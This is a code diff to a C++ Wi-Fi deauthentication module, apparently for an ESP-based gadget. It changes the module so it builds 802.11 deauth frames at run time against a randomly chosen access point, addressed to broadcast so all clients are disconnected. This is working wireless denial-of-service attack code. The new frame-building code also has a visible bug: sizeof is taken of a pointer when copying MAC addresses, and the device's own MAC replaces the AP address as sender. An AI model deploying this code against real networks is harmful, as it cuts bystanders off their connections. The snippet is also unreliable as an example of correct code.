@@ -17,15 +17,12 @@ bool Deauth::running = false;
 std::vector<String> Deauth::whitelist = {};
 String Deauth::randomAP = "";
 
-uint8_t Deauth::deauthFrame[26] = {
-    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
-    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
-    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
-    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
-    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
-};
+/** developer note:
+ * 
+ * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
+ * 
+*/
+uint8_t Deauth::deauthFrame[26];
 
 void Deauth::add(const std::string& bssids) {
     std::stringstream ss(bssids);
@@ -95,6 +92,44 @@ void Deauth::select() {
         Display::cleanDisplayFace("('-')");
         Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
         delay(1000);
+        
+        /** developer note:
+         * 
+         * here we will create the deauth frame using the header, 
+         * as we find the AP in question we also generate the required information for it as well...
+         * 
+        */
+
+        // clear out exisitng frame...
+        std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
+
+        Deauth::deauthFrame[0] = 0xC0; // type
+        Deauth::deauthFrame[1] = 0x00; // subtype
+        Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
+        Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
+
+        // bssid
+        uint8_t* bssid = WiFi.BSSID(randomIndex);
+
+         // set our mac address
+        uint8_t mac[WL_MAC_ADDR_LENGTH];
+        WiFi.macAddress(mac);
+
+        // broadcast address
+        uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+        /** developer note:
+        * 
+        * addr1: reciever addr
+        * addr2: sender addr
+        * addr3: filtering addr
+        * 
+        */
+
+        // copy our mac(s) to header
+        std::copy(broadcastAddr, broadcastAddr + sizeof(bssid), Deauth::deauthFrame + 4);
+        std::copy(mac, mac + sizeof(mac), Deauth::deauthFrame + 10);
+        std::copy(bssid, bssid + sizeof(bssid), Deauth::deauthFrame + 16);
     } else {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
